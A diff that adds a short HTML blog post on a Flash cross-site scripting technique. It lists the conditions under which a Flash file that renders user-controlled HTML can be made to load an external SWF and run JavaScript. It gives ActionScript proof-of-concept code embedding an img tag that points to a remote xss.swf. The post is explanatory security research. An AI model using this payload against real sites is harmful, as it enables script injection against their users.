@@ -1,1 +1,42 @@
-Hello
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>Stefano</title>
+</head>
+
+<body>
+  <h1>Flash XSS using images</h1>
+  Because it has been a long time since my last post, I decided to write about something that I noticed a few weeks ago and I didn't know.
+
+Sometimes you may notice that a Flash file displays images from an URL that you can modify or displays HTML content that you can modify. This feature will allow you to load an external Flash file and execute Javascript code.
+
+The requirements for this to work:
+
+    The Flash file must be loaded using <code>&lt;embed&gt;</code> or <code>&lt;object&gt;</code>, you can't execute Javascript code if the file is loaded directly from the browser.
+    The attribute allowscriptaccess must be set to always.
+
+IMG tag example (it's based on the example given in the ActionScript 3.0 developer's guide):
+
+  <pre>
+  package
+  {
+      import flash.display.Sprite;
+      import flash.text.*;
+
+      public class TextWithImage extends Sprite
+      {
+          private var myTextBox:TextField = new TextField();
+          private var myText:String = 'Example <img src="//u00f1.xyz/xss.swf">'; // I don't know why, but some text is necessary. That's why I put "Example"
+
+          public function TextWithImage()
+          {
+              myTextBox.htmlText = myText;
+              addChild(myTextBox);
+          }
+      }
+  }
+  </pre>
+</body>
+
+</html>
